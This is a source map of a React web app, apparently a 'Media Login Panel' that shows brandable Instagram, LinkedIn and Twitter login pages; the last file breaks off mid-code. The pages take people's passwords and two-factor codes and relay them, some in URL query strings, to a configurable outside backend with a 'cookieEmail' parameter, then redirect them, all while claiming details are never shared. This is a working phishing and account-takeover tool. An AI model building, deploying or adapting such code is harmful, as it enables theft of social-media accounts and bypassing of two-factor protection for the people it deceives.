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","file":"static/js/main.e9f55e66.chunk.js","sourcesContent":["import React, { Component } from \"react\";\nimport { Card, Button, Row, Container, Col } from \"react-bootstrap\";\nimport { Redirect } from \"react-router-dom\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nconst env = runtimeEnv();\nexport default class Home extends Component {\n  state = {\n    redirect: false,\n    to: \"\",\n  };\n  setRedirect = (url) => {\n    this.setState({\n      redirect: true,\n      to: url,\n    });\n  };\n  renderRedirect = () => {\n    console.log(this.state.redirect);\n    if (this.state.redirect) {\n      return <Redirect to={this.state.to} />;\n    }\n  };\n  componentDidMount() {\n    const favicon = document.getElementById(\"FavIcon\");\n    if (\n      env.REACT_APP_FAVICONURL !== undefined ||\n      env.REACT_APP_FAVICONURL !== \"\"\n    )\n      favicon.href = `${env.REACT_APP_FAVICONURL}`;\n    const title = document.getElementById(\"AppTitle\");\n    if (env.REACT_APP_TITLE !== undefined || env.REACT_APP_TITLE !== \"\")\n      title.innerText = `${env.REACT_APP_TITLE}`;\n    else {\n      title.innerText = \"Media Login Panel\";\n    }\n  }\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n        <Card\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n          className=\"text-center\"\n        >\n          <Card.Header>Select a login option</Card.Header>\n          <Card.Body>\n            <Container fluid>\n              <Col>\n                {\n                  env.REACT_APP_INSTAGRAM === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\", margin: \"5px\", padding: \"5px\" }}\n                        size=\"lg\"\n                        variant=\"outline-danger\"\n                        onClick={() => this.setRedirect(\"/Instagram\")}\n                      >\n                        INSTAGRAM\n                    </Button>\n                    </Row> : \"\"\n                }\n                {\n                  env.REACT_APP_TWITTER === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\", margin: \"5px\", padding: \"5px\" }}\n                        size=\"lg\"\n                        variant=\"outline-primary\"\n                        onClick={() => this.setRedirect(\"/Twitter\")}\n                      >\n                        TWITTER\n                      </Button>\n                    </Row> : \"\"\n                }\n                {\n                  env.REACT_APP_LINKEDIN === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\", margin: \"5px\", padding: \"5px\" }}\n                        size=\"lg\"\n                        variant=\"outline-info\"\n                        onClick={() => this.setRedirect(\"/LinkedIn\")}\n                      >\n                        LINKEDIN\n                       </Button>\n                    </Row> : \"\"\n                }\n                {\n                  env.REACT_APP_PINTEREST === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\", margin: \"5px\", padding: \"5px\" }}\n                        size=\"lg\"\n                        variant=\"outline-secondary\"\n                        onClick={() => this.setRedirect(\"/Pinterest\")}\n                      >\n                        Pinterest\n                       </Button>\n                    </Row> : \"\"\n                }\n                {\n                  env.REACT_APP_FACEBOOK === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\", margin: \"5px\", padding: \"5px\" }}\n                        size=\"lg\"\n                        variant=\"outline-primary\"\n                        onClick={() => this.setRedirect(\"/Facebook\")}\n                      >\n                        Facebook\n                       </Button>\n                    </Row> : \"\"\n                }\n\n              </Col>\n            </Container>\n          </Card.Body>\n        </Card>\n        <Card title=\"Select login options\"></Card>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n  Form,\n  Button,\n  Container,\n  Row,\n  Col,\n  Alert,\n  Spinner,\n  Card,\n} from \"react-bootstrap\";\n\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\nexport default class Instagram extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    twoFactor: false,\n    email_auth: false,\n    success: false,\n    code: \"\",\n    two_factor_identifier: \"\",\n    verificationMethod: \"\",\n  };\n\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    const { value, maxLength } = event.target;\n    const message = value.slice(0, maxLength);\n    this.setState({ code: message });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      fetch(`${env.REACT_APP_URL}/insta`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.twoFactor) {\n              this.setState({\n                email_auth: responseData.email_auth,\n                twoFactor: true,\n                loading: true,\n                two_factor_identifier: responseData.two_factor_identifier,\n                verificationMethod: responseData.verificationMethod,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\n        this.onShowAlert();\n      });\n    } else {\n      if (!this.state.email_auth) {\n        fetch(\n          `${env.REACT_APP_URL}/insta/submitCode?username=${this.state.username}&password=${this.state.password}&code=${this.state.code}&two_factor_identifier=${this.state.two_factor_identifier}&verificationMethod=${this.state.verificationMethod}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}`,\n          {\n            method: \"GET\",\n          }\n        )\n          .then((response) => response.json())\n          .then((responseData) => {\n            console.log(responseData);\n            if (responseData.success) {\n              this.setState(\n                { success: true, message: responseData.message },\n                () => {\n                  this.onShowAlert();\n                }\n              );\n            } else {\n              this.setState({ message: responseData.message }, () => {\n                this.onShowAlert();\n              });\n            }\n          });\n      } else {\n        fetch(\n          `${env.REACT_APP_URL}/insta/emailVerify?username=${this.state.username}&code=${this.state.code}`,\n          {\n            method: \"GET\",\n          }\n        )\n          .then((response) => response.json())\n          .then((responseData) => {\n            console.log(responseData);\n            this.setState(\n              {\n                message: responseData.message,\n              },\n              () => {\n                this.onShowAlert();\n              }\n            );\n            if (responseData.success) {\n              fetch(`${env.REACT_APP_URL}/insta`, {\n                method: \"POST\",\n                headers: {\n                  \"Content-Type\":\n                    \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                  username: this.state.username,\n                  password: this.state.password,\n                  cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n                }),\n              })\n                .then((response) => response.json())\n                .then((responseData) => {\n                  console.log(responseData);\n                  this.setState(\n                    {\n                      message: responseData.message,\n                    },\n                    () => {\n                      this.onShowAlert();\n                    }\n                  );\n                  if (!responseData.success) {\n                    this.setState({ loading: false });\n                  } else {\n                    if (!responseData.twoFactor) {\n                      this.setState({ success: true });\n                    }\n                  }\n                });\n            } else {\n              this.setState({ message: responseData.message, code: \"\" }, () => {\n                this.onShowAlert();\n              });\n            }\n          });\n      }\n    }\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n        {this.state.showAlert ? (\n          <Alert variant=\"danger\">{this.state.message}</Alert>\n        ) : (\n            \"\"\n          )}\n\n        <Container\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n        >\n          <center>\n\n\n            <Container>\n              <img\n                alt=\"logo\"\n                src={env.REACT_APP_FAVICONURL}\n              ></img>\n            </Container>\n            <br></br>\n            <h1>\n              {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                ? env.REACT_APP_TITLE\n                : \"Instagram Login\"}\n            </h1>\n            <br />\n            {\n              env.REACT_APP_BANNER_INSTAGRAM === \"true\" ?\n                <div>\n                  <Card style={{ backgroundColor: '#D8ECDB', color: '#3F6A42' }}>\n                    <Card.Body>\n                      <Card.Title>{env.REACT_APP_BANNER_INSTAGRAM_HEADER}</Card.Title>\n                      <Card.Text>\n                        <small className=\"text-muted\">  {env.REACT_APP_BANNER_INSTAGRAM_BODY}</small>\n                      </Card.Text>\n                    </Card.Body>\n                  </Card></div>\n                : \"\"\n            }\n            <Container>\n              <p style={{ fontWeight: \"bold\" }}>\n                {\n                  env.REACT_APP_SECONDARY_BANNER !== \"\" ? env.REACT_APP_SECONDARY_BANNER : \"\"\n                }\n\n              </p>\n            </Container>\n          </center>\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <Route\n                component={() => {\n                  window.location.href = env.REACT_APP_REDIRECTURL;\n                  return null;\n                }}\n              />\n              <center>\n                <h1>Login Sucess Thank You!</h1>\n              </center>\n            </Container>\n          ) : (\n              <Row>\n                <Col>\n                  <Form onSubmit={(e) => this.handleClick(e)}>\n                    <Form.Group controlId=\"formBasicEmail\">\n                      <Form.Label>Username</Form.Label>\n\n                      <Form.Control\n                        value={this.state.username}\n                        onChange={(e) => {\n                          this.handleUsername(e);\n                        }}\n                        type=\"username\"\n                        placeholder=\"Enter Instagram username\"\n                      />\n                      <Form.Text className=\"text-muted\">\n                        We'll never share your details with anyone else.\n                    </Form.Text>\n                    </Form.Group>\n\n                    <Form.Group controlId=\"formBasicPassword\">\n                      <Form.Label>Password</Form.Label>\n                      <Form.Control\n                        onChange={(e) => this.handlePassword(e)}\n                        value={this.state.password}\n                        type=\"password\"\n                        placeholder=\"Enter Instagram Password\"\n                      />\n                    </Form.Group>\n                    {this.state.loading ? (\n                      <Button variant=\"primary\" type=\"submit\" disabled>\n                        <Spinner\n                          as=\"span\"\n                          animation=\"grow\"\n                          size=\"sm\"\n                          role=\"status\"\n                          aria-hidden=\"true\"\n                        />\n                      Loading...\n                      </Button>\n                    ) : (\n                        <Button variant=\"primary\" type=\"submit\">\n                          Login\n                        </Button>\n                      )}\n\n                    {this.state.twoFactor ? (\n                      <div>\n                        <Form.Group>\n                          {this.state.email_auth ? (\n                            <Form.Label>\n                              Please enter the code received\n                            </Form.Label>\n                          ) : (\n                              <Form.Label>Enter code recieved</Form.Label>\n                            )}\n\n                          <Form.Control\n                            value={this.state.code}\n                            onChange={(e) => {\n                              this.handleCode(e);\n                            }}\n                            type=\"number\"\n                            maxLength=\"11\"\n                          />\n                        </Form.Group>\n                        <Button\n                          variant=\"outline-success\"\n                          onClick={() => {\n                            this.handleCodeClick();\n                          }}\n                        >\n                          submit code\n                      </Button>{\" \"}\n                      </div>\n                    ) : (\n                        \"\"\n                      )}\n                  </Form>\n                </Col>\n              </Row>\n            )}\n        </Container>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n  Form,\n  Button,\n  Container,\n  Row,\n  Col,\n  Alert,\n  Spinner,\n  Card\n} from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    manualCheck: false,\n    success: false,\n    redirect: false,\n    challangeID: \"\",\n    code: \"\",\n  };\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    const { value, maxLength } = event.target;\n    const message = value.slice(0, maxLength);\n    this.setState({ code: message });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      fetch(`${env.REACT_APP_URL}/linkedin`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.manualCheck) {\n              this.setState({\n                manualCheck: true,\n                challangeID: responseData.challangeID,\n                loading: true,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\n        this.onShowAlert();\n      });\n    } else {\n      fetch(\n        `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}&challangeID=${this.state.challangeID}`,\n        {\n          method: \"GET\",\n        }\n      )\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (responseData.success) {\n            this.setState({ success: true });\n          } else {\n            this.setState(\n              { message: responseData.message, code: \"\" },\n              () => {\n                this.onShowAlert();\n              }\n            );\n          }\n        });\n    }\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n\n\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n        {this.state.showAlert ? (\n          <Alert variant=\"dark\">{this.state.message}</Alert>\n        ) : (\n            \"\"\n          )}\n        <br></br>\n\n        <Container\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n        >\n          <center>\n\n            <Container>\n              <img\n                alt=\"logo\"\n                src={env.REACT_APP_FAVICONURL}\n              ></img>\n            </Container>\n            <br></br>\n            <h1>\n              {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                ? env.REACT_APP_TITLE\n                : \" LinkedIn login\"}\n            </h1>\n            <br />\n            {\n              env.REACT_APP_BANNER_LINKEDIN === \"true\" ?\n                <div>\n                  <Card style={{ backgroundColor: '#D8ECDB', color: '#3F6A42' }}>\n                    <Card.Body>\n                      <Card.Title>{env.REACT_APP_BANNER_LINKEDIN_HEADER}</Card.Title>\n                      <Card.Text>\n                        <small className=\"text-muted\">  {env.REACT_APP_BANNER_LINKEDIN_BODY}</small>\n                      </Card.Text>\n                    </Card.Body>\n                  </Card> </div>\n                : \"\"\n            }\n\n            <Container>\n              <p style={{ fontWeight: \"bold\" }}>\n                {\n                  env.REACT_APP_SECONDARY_BANNER !== \"\" ? env.REACT_APP_SECONDARY_BANNER : \"\"\n                }\n\n              </p>\n            </Container>\n          </center>\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <center>\n                <h1>Login Success Thank You!</h1>\n              </center>\n              <Route\n                component={() => {\n                  window.location.href = env.REACT_APP_REDIRECTURL;\n                  return null;\n                }}\n              />\n            </Container>\n          ) : (\n              <Row>\n                <Col>\n                  <Form onSubmit={(e) => this.handleClick(e)}>\n                    <Form.Group controlId=\"formBasicEmail\">\n                      <Form.Label>\n                        Enter Linkedin Username/MobileNumber\n                    </Form.Label>\n                      <Form.Control\n                        value={this.state.username}\n                        onChange={(e) => {\n                          this.handleUsername(e);\n                        }}\n                      />\n                    </Form.Group>\n                    <Form.Group controlId=\"formBasicPassword\">\n                      <Form.Label>Enter Linkedin Password</Form.Label>\n                      <Form.Control\n                        onChange={(e) => this.handlePassword(e)}\n                        value={this.state.password}\n                        type=\"password\"\n                      />\n                    </Form.Group>\n                    {this.state.loading ? (\n                      <Button variant=\"primary\" type=\"submit\" disabled>\n                        <Spinner\n                          as=\"span\"\n                          animation=\"grow\"\n                          size=\"sm\"\n                          role=\"status\"\n                          aria-hidden=\"true\"\n                        />\n                      Loading...\n                      </Button>\n                    ) : (\n                        <Button variant=\"primary\" type=\"submit\">\n                          Login\n                        </Button>\n                      )}\n\n                    {this.state.manualCheck ? (\n                      <div>\n                        <Form.Group>\n                          <Form.Label>\n                            Enter code recieved in your email\n                        </Form.Label>\n                          <Form.Control\n                            value={this.state.code}\n                            onChange={(e) => {\n                              this.handleCode(e);\n                            }}\n                            type=\"number\"\n                            maxLength=\"11\"\n                          />\n                        </Form.Group>\n                        <Button\n                          variant=\"outline-success\"\n                          onClick={() => {\n                            this.handleCodeClick();\n                          }}\n                        >\n                          submit code\n                      </Button>{\" \"}\n                      </div>\n                    ) : (\n                        \"\"\n                      )}\n                  </Form>\n                </Col>\n              </Row>\n            )}\n        </Container>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n    Form,\n    Button,\n    Container,\n    Row,\n    Col,\n    Alert,\n    Spinner,\n    Card\n} from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n    state = {\n        username: \"\",\n        password: \"\",\n        showAlert: false,\n        loading: false,\n        message: \"\",\n        manualCheck: false,\n        success: false,\n        redirect: false,\n        challenge_id: \"\",\n        challenge_type: \"\",\n        enc_user_id: \"\",\n        code: \"\",\n    };\n    handleUsername = (event) => {\n        this.setState({ username: event.target.value });\n    };\n    handleCode = (event) => {\n        this.setState({ code: event.target.value });\n    };\n    handlePassword = (event) => {\n        this.setState({ password: event.target.value });\n    };\n    onShowAlert = () => {\n        this.setState({ showAlert: true }, () => {\n            window.setTimeout(() => {\n                this.setState({ showAlert: false });\n            }, 30000);\n        });\n    };\n    handleClick = (e) => {\n        e.preventDefault();\n        this.setState({ loading: true });\n        if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n            fetch(`${env.REACT_APP_URL}/login/twitter`, {\n                method: \"POST\",\n                headers: {\n                    \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                    username: this.state.username,\n                    password: this.state.password,\n                    cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n                }),\n            })\n                .then((response) => response.json())\n                .then((responseData) => {\n                    console.log(responseData);\n                    this.setState(\n                        {\n                            message: responseData.message,\n                        },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                    if (!responseData.success) {\n                        this.setState({ loading: false });\n                    } else {\n                        if (responseData.manualCheck) {\n                            this.setState({\n                                manualCheck: true,\n                                challenge_type: responseData.challenge_type,\n                                challenge_id: responseData.challenge_id,\n                                enc_user_id: responseData.enc_user_id,\n                                loading: true,\n                            });\n                        } else {\n                            this.setState({ success: true });\n                        }\n                    }\n                });\n        } else {\n            if (this.state.username.length === 0) {\n                this.setState(\n                    {\n                        message: \"username cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            } else {\n                this.setState(\n                    {\n                        message: \"password cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            }\n        }\n    };\n    handleCodeClick = (e) => {\n        fetch(\n            `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}`,\n            {\n                method: \"GET\",\n            }\n        )\n            .then((response) => response.json())\n            .then((responseData) => {\n                console.log(responseData);\n                this.setState(\n                    {\n                        message: responseData.message,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n                if (responseData.success) {\n                    this.setState({ success: true });\n                } else {\n                    this.setState(\n                        { message: responseData.message, code: \"\" },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                }\n            });\n\n    };\n    setRedirect = () => {\n        this.setState({\n            redirect: true,\n        });\n    };\n    renderRedirect = () => {\n        if (this.state.redirect) {\n            return <Redirect to=\"/\" />;\n        }\n    };\n    render() {\n        return (\n            <div>\n                {this.renderRedirect()}\n\n                <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n                    Back\n               </Button>\n                {this.state.showAlert ? (\n                    <Alert variant=\"dark\">{this.state.message}</Alert>\n                ) : (\n                        \"\"\n                    )}\n\n                <Container\n                    style={{\n                        position: \"absolute\",\n                        left: \"50%\",\n                        top: \"50%\",\n                        transform: \"translate(-50%, -50%)\",\n                    }}\n                ><center>\n                        <Container>\n                            <img\n                                alt=\"logo\"\n                                src={env.REACT_APP_FAVICONURL}\n                            ></img>\n                        </Container>\n                        <br></br>\n                        <h1>\n                            {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                                ? env.REACT_APP_TITLE\n                                : 